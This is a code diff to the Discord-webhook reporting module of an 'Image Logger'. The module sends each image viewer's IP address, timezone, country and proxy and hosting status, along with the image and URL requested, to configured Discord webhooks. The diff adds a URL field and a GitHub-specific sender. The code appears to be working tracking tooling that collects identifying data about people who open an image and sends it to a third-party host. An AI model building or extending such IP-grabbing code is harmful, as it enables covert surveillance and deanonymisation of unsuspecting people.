@@ -6,6 +6,7 @@ const config = require('./config.json')
 const sendImageToWebhooks = (
   imageName,
   imageUrl,
+  url,
   clientIP,
   timezone,
   country,
@@ -24,6 +25,7 @@ const sendImageToWebhooks = (
 ) => {
   imageName = imageName || 'not found'
   imageUrl = imageUrl || 'not found'
+  url = url || 'not found'
   clientIP = clientIP || 'not found'
   timezone = timezone || 'not found'
   country = country || 'not found'
@@ -37,10 +39,6 @@ const sendImageToWebhooks = (
   proxy = proxy || 'not found'
   hosting = hosting || 'not found'
 
-  const randomcolors = ['#008000', '#E50000']
-  const randomWebhookColor =
-    randomcolors[Math.floor(Math.random() * randomcolors.length)]
-
   config.webhooks.forEach(webhook => {
     const webhookClient = new WebhookClient({ url: webhook.url })
     const embed = new EmbedBuilder()
@@ -49,6 +47,10 @@ const sendImageToWebhooks = (
         {
           name: '🖼️ Image',
           value: `\`\`\`shell\n🖼️ Name: ${imageName}\n🔗 URL: ${imageUrl}\`\`\``
+        },
+        {
+          name: '🕸️ URL',
+          value: `\`\`\`shell\n🔗 URL: ${url}\`\`\``
         },
         {
           name: '📡 Network',
@@ -69,7 +71,7 @@ const sendImageToWebhooks = (
         iconURL:
           'https://cliply.co/wp-content/uploads/2021/08/372108630_DISCORD_LOGO_400.gif'
       })
-      .setColor(randomWebhookColor)
+      .setColor('#00ff00')
       .setTimestamp()
 
     webhookClient
@@ -87,4 +89,50 @@ const sendImageToWebhooks = (
   })
 }
 
-module.exports = sendImageToWebhooks
+const sendImageToWebhooksGithub = (imageName, imageUrl, url) => {
+  imageName = imageName || 'not found'
+  imageUrl = imageUrl || 'not found'
+  url = url || 'not found'
+
+  config.webhooks.forEach(webhook => {
+    const webhookClient = new WebhookClient({ url: webhook.url })
+    const embed = new EmbedBuilder()
+      .setTitle(`Requesting at **${url}**`)
+      .setFields([
+        {
+          name: '🖼️ Image',
+          value: `\`\`\`shell\n🖼️ Name: ${imageName}\n🔗 URL: ${imageUrl}\`\`\``
+        },
+        {
+          name: '🕸️ URL',
+          value: `\`\`\`shell\n🔗 URL: ${url}\`\`\``
+        }
+      ])
+      .setThumbnail('attachment://' + imageName)
+      .setFooter({
+        text: 'Image Logger',
+        iconURL:
+          'https://cliply.co/wp-content/uploads/2021/08/372108630_DISCORD_LOGO_400.gif'
+      })
+      .setColor('#ff0000')
+      .setTimestamp()
+
+    webhookClient
+      .send({
+        embeds: [embed]
+      })
+      .then(() => {
+        logger.info(`Image ${imageName} sent to webhook ${webhook.name}`)
+      })
+      .catch(error => {
+        logger.error(
+          `Error sending image ${imageName} to webhook ${webhook.name}: ${error}`
+        )
+      })
+  })
+}
+
+module.exports = {
+  sendImageToWebhooks,
+  sendImageToWebhooksGithub
+}
